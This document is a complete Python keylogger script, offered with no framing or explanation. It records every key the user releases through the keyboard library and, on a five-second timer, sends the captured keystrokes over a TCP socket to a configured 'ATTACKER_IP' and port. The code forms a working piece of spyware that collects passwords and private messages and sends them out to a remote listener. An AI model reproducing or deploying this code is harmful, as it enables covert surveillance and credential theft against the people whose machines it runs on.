import keyboard
import socket
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 5
ATTACKER_IP = '0.0.0.0'
ATTACKER_PORT = 12345
VERSION = "V1.0"

class Keylogger:
    def __init__(self):
        self.interval = SEND_REPORT_EVERY
        self.attacker_ip = ATTACKER_IP
        self.attacker_port = ATTACKER_PORT
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) == 1 or name in ['space', 'enter']:
            self.log += f"[{name}]"
        else:
            self.log += f"[{name.upper()}]"

    def report(self):
        if self.log:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.attacker_ip, self.attacker_port))
                    s.sendall(self.log.encode())
                    print("Keylogs sent")
            except Exception as e:
                print(f"[-] Error: {e}")

            self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
